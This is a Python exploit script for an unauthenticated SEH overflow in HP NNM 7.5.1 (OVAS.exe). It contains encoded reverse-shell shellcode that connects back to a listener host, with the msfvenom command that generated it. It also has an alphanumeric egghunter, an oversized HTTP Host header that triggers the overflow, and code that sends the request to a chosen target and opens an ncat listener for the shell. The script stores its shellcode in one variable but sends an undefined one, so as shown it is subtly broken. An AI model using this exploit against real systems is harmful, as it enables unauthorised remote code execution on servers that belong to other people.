#!/usr/bin/python
import sys
import time
import struct
import socket
import subprocess

#----------------------------------------------------------------------------------#
# Exploit: HP NNM 7.5.1 - 'OVAS.exe' Unauthenticated Overflow (SEH)                #
# OS Tested: Windows .NET Server (Build 3790, Service Pack 1) x86                  #
# Author: Amonsec                                                                  #
# Date: Sun, 17 September 2017                                                     #
#----------------------------------------------------------------------------------#
# Thanks:                                                                          #
#       muts       (https://www.offensive-security.com/)                           #
#       Ch3rn0byl  (http://ch3rn0byl.com/)                                         #
####################################################################################
_RED = '\x1b[1;31m'
_BLU = '\x1b[1;34m'
_GRE = '\x1b[1;32m'
_RST = '\x1b[0;0;0m'

successMessage = lambda x: '{}[+]{} {}'.format(_GRE, _RST, x)
errorMessage = lambda x: '{}[-]{} {}'.format(_RED, _RST, x)
infoMessage = lambda x: '{}[*]{} {}'.format(_BLU, _RST, x)

print infoMessage('HP NNM 7.5.1 - \'OVAS.exe\' Unauthenticated Overflow (SEH)')
print infoMessage('Original exploit author: {}muts{}'.format(_RED, _RST))
print infoMessage('Author: {}Amonsec{}\n'.format(_RED, _RST))

if len(sys.argv) < 3:
	print infoMessage('Usage: python {} <rhost> <rport>'.format(sys.argv[0]))
	print infoMessage('Usage Examples: ')
	print '\t python {} 192.168.100.85 7510'.format(sys.argv[0])
	sys.exit(-1)
else:
	rhost = sys.argv[1]
	rport = int(sys.argv[2])

'''
Shellcode generation:
msfvenom --platform windows -p windows/shell_reverse_tcp LPORT=1337 \
LHOST=192.168.100.33 BufferRegister=EDI -f raw -e x86/alpha_mixed -b '\x00\x0a\x0d' -a x86 EXITFUNC=thread
'''
buf =  b""
buf += b"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x4b\x4c\x49\x78\x6f\x72\x67\x70\x67\x70\x53\x30\x65"
buf += b"\x30\x6b\x39\x79\x75\x66\x51\x4f\x30\x65\x34\x6e\x6b"
buf += b"\x36\x30\x70\x30\x6c\x4b\x73\x62\x46\x6c\x6c\x4b\x56"
buf += b"\x32\x74\x54\x6c\x4b\x42\x52\x56\x48\x64\x4f\x4c\x77"
buf += b"\x51\x5a\x45\x76\x55\x61\x4b\x4f\x6c\x6c\x45\x6c\x45"
buf += b"\x31\x33\x4c\x65\x52\x64\x6c\x77\x50\x6f\x31\x58\x4f"
buf += b"\x36\x6d\x66\x61\x6b\x77\x4a\x42\x58\x72\x51\x42\x61"
buf += b"\x47\x6c\x4b\x50\x52\x36\x70\x4c\x4b\x63\x7a\x67\x4c"
buf += b"\x6e\x6b\x62\x6c\x52\x31\x53\x48\x59\x73\x31\x58\x37"
buf += b"\x71\x48\x51\x33\x61\x6e\x6b\x62\x79\x55\x70\x67\x71"
buf += b"\x48\x53\x4c\x4b\x53\x79\x66\x78\x69\x73\x74\x7a\x51"
buf += b"\x59\x6e\x6b\x45\x64\x4c\x4b\x56\x61\x78\x56\x70\x31"
buf += b"\x49\x6f\x6e\x4c\x49\x51\x38\x4f\x76\x6d\x43\x31\x39"
buf += b"\x57\x37\x48\x59\x70\x44\x35\x7a\x56\x73\x33\x71\x6d"
buf += b"\x7a\x58\x77\x4b\x73\x4d\x74\x64\x54\x35\x68\x64\x31"
buf += b"\x48\x6e\x6b\x30\x58\x45\x74\x55\x51\x68\x53\x65\x36"
buf += b"\x6e\x6b\x44\x4c\x30\x4b\x6e\x6b\x70\x58\x77\x6c\x46"
buf += b"\x61\x7a\x73\x4c\x4b\x77\x74\x6c\x4b\x36\x61\x4e\x30"
buf += b"\x4f\x79\x37\x34\x67\x54\x74\x64\x51\x4b\x63\x6b\x50"
buf += b"\x61\x73\x69\x62\x7a\x43\x61\x69\x6f\x4d\x30\x51\x4f"
buf += b"\x31\x4f\x30\x5a\x6c\x4b\x56\x72\x4a\x4b\x6c\x4d\x43"
buf += b"\x6d\x72\x48\x47\x43\x57\x42\x45\x50\x33\x30\x63\x58"
buf += b"\x61\x67\x51\x63\x57\x42\x73\x6f\x61\x44\x35\x38\x70"
buf += b"\x4c\x32\x57\x77\x56\x75\x57\x79\x6f\x69\x45\x4d\x68"
buf += b"\x6c\x50\x53\x31\x53\x30\x37\x70\x51\x39\x7a\x64\x32"
buf += b"\x74\x36\x30\x62\x48\x75\x79\x6b\x30\x62\x4b\x57\x70"
buf += b"\x4b\x4f\x6b\x65\x70\x50\x50\x50\x30\x50\x70\x50\x43"
buf += b"\x70\x30\x50\x31\x50\x56\x30\x65\x38\x5a\x4a\x76\x6f"
buf += b"\x4b\x6f\x6b\x50\x4b\x4f\x39\x45\x4f\x67\x73\x5a\x74"
buf += b"\x45\x52\x48\x6f\x30\x49\x38\x37\x6d\x75\x5a\x71\x78"
buf += b"\x65\x52\x75\x50\x73\x35\x37\x49\x4d\x59\x6a\x46\x43"
buf += b"\x5a\x46\x70\x42\x76\x43\x67\x71\x78\x4f\x69\x4d\x75"
buf += b"\x31\x64\x73\x51\x4b\x4f\x78\x55\x6d\x55\x49\x50\x34"
buf += b"\x34\x54\x4c\x4b\x4f\x70\x4e\x76\x68\x51\x65\x78\x6c"
buf += b"\x53\x58\x6c\x30\x6d\x65\x49\x32\x50\x56\x6b\x4f\x78"
buf += b"\x55\x35\x38\x32\x43\x32\x4d\x73\x54\x53\x30\x6c\x49"
buf += b"\x39\x73\x53\x67\x36\x37\x50\x57\x30\x31\x4a\x56\x30"
buf += b"\x6a\x66\x72\x62\x79\x51\x46\x59\x72\x59\x6d\x72\x46"
buf += b"\x38\x47\x71\x54\x67\x54\x77\x4c\x56\x61\x33\x31\x6e"
buf += b"\x6d\x70\x44\x51\x34\x74\x50\x6a\x66\x75\x50\x42\x64"
buf += b"\x31\x44\x70\x50\x51\x46\x36\x36\x70\x56\x52\x66\x71"
buf += b"\x46\x72\x6e\x36\x36\x43\x66\x63\x63\x30\x56\x53\x58"
buf += b"\x31\x69\x5a\x6c\x47\x4f\x6b\x36\x6b\x4f\x59\x45\x6f"
buf += b"\x79\x49\x70\x52\x6e\x33\x66\x71\x56\x59\x6f\x46\x50"
buf += b"\x35\x38\x54\x48\x4f\x77\x67\x6d\x35\x30\x4b\x4f\x39"
buf += b"\x45\x4d\x6b\x4d\x30\x65\x4d\x44\x6a\x35\x5a\x72\x48"
buf += b"\x49\x36\x4a\x35\x6f\x4d\x6f\x6d\x49\x6f\x69\x45\x57"
buf += b"\x4c\x34\x46\x43\x4c\x44\x4a\x4b\x30\x39\x6b\x6d\x30"
buf += b"\x54\x35\x44\x45\x4d\x6b\x61\x57\x34\x53\x43\x42\x52"
buf += b"\x4f\x33\x5a\x43\x30\x70\x53\x49\x6f\x7a\x75\x41\x41"

shellcode += '\xcc' * 500

'''
Original egghunter in Python format:
egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58'
egghunter += '\xcd\x2e\x3c\x05\x5a\x74\xef\xb8'
egghunter += '\x41\x6d\x6f\x6e'
egghunter += '\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
'''
egghunter = ''                                     
egghunter += '\x25' + struct.pack('<L', 0x554e4d4a) # and eax, 554e4d4a
egghunter += '\x25' + struct.pack('<L', 0x2a313235) # and eax, 2a313235
egghunter += '\x54'                                 # push esp
egghunter += '\x58'                                 # pop eax
##############################################################################################
egghunter += '\x2d' + struct.pack('<L', 0x55554d66) # sub eax, 55554d66  | 
egghunter += '\x2d' + struct.pack('<L', 0x55554b66) # sub eax, 55554b66  | Stack 
egghunter += '\x2d' + struct.pack('<L', 0x5555506a) # sub eax, 5555506a  | alignment
egghunter += '\x50'                                 # push eax           |
egghunter += '\x5c'                                 # pop esp            |
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 8/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x55555521) # sub eax, 55555521  | of your
egghunter += '\x2d' + struct.pack('<L', 0x55555421) # sub eax, 55555421  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x6D556F49) # sub eax, 6D556F49  |
egghunter += '\x50'                                 # push eax           | \x75\xe7\xff\xe7
###############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 7/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x75612171) # sub eax, 75612171  | of your
egghunter += '\x2d' + struct.pack('<L', 0x75612171) # sub eax, 75612171  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x6553476F) # sub eax, 6553476F  |
egghunter += '\x50'                                 # push eax           | \xaf\x75\xea\xaf
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 6/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x03707f7f) # sub eax, 03707f7f  | of your
egghunter += '\x2d' + struct.pack('<L', 0x01020909) # sub eax, 01020909  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x01020909) # sub eax, 01020909  |
egghunter += '\x50'                                 # push eax           | \x6f\x6e\x8b\xfa
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 5/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x5f7f4509) # sub eax, 5f7f4509  | of your
egghunter += '\x2d' + struct.pack('<L', 0x31370105) # sub eax, 31370105  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x02080103) # sub eax, 02080103  |
egghunter += '\x50'                                 # push eax           | \xef\xb8\x41\x6d
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 4/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x2d317333) # sub eax, 2d317333  | of your
egghunter += '\x2d' + struct.pack('<L', 0x2d313333) # sub eax, 2d313333  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x3143545e) # sub eax, 3143545e  |
egghunter += '\x50'                                 # push eax           | \x3c\x05\x5a\x74
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 3/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x45773144) # sub eax, 45773144  | of your
egghunter += '\x2d' + struct.pack('<L', 0x45473145) # sub eax, 45473145  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x46744575) # sub eax, 46744575  |
egghunter += '\x50'                                 # push eax           | \x02\x58\xcd\x2e
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 2/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x32323252) # sub eax, 32323252  | of your
egghunter += '\x2d' + struct.pack('<L', 0x31313131) # sub eax, 31313131  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x324a5a6e) # sub eax, 324a5a6e  |
egghunter += '\x50'                                 # push eax           | \x0f\x42\x52\x6a
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 1/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x44772d31) # sub eax, 44772d31  | of your
egghunter += '\x2d' + struct.pack('<L', 0x44772d31) # sub eax, 44772d31  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x77472438) # sub eax, 77472438  |
egghunter += '\x50'                                 # push eax           | \x66\x81\xca\xff
##############################################################################################

'''
The first stage
'''
exploit = ''
exploit += '\x4c' * 3377                   # Junk
exploit += struct.pack('<L', 0x21774c4c)   # Jump over the return address
exploit += struct.pack('<L', 0x6d356c6e)   # POP POP RET address
exploit += '\x47' * 32                     # Padding
exploit += egghunter                       # Painful egghunter
exploit += '\x41' * 100                    # Padding

'''
Build the malicious HTTP request
'''
header = ''
header += 'GET /topology/homeBaseView HTTP/1.1\r\n'
header += 'Host: ' + exploit + ':7510\r\n'
header += 'Current-Type: application/x-www-form-urlencode\r\n'
header += 'User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n'
header += 'Content-Length: 1048580\r\n\r\n'
header += 'AmonAmon'
header += shellcode

'''
Exploit information
'''
print infoMessage('Remote target: {}:{}'.format(rhost, rport))
print infoMessage('Exploit lenght: {} bytes'.format(len(exploit)))
print infoMessage('Shelcode lenght: {} bytes'.format(len(shellcode) - 500))
print infoMessage('Egghunter lenght: {} bytes'.format(len(egghunter)))
print infoMessage('Hunted tag: {}Amon{}\n'.format(_RED, _RST))

'''
Trying to exploit the HP NNM v7.5.1 vulnerability
'''
try:
	print infoMessage('Trying to establish a connect with the target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, rport))
	print successMessage('Connection successfully established!')

	print infoMessage('Trying to send the evil HTTP request ...')
	s.send(header)
	s.close()
	print successMessage('Evil HTTP request successfully sent!')

	print infoMessage('Waiting the reverse shell...\n')
	subprocess.call(['ncat -lvvp 1337'], shell=True)

except socket.error as error:
	s.close()

	print errorMessage('Ooouuups! Something goes wrong!')
	print errorMessage('Try later?!')
	sys.exit(1)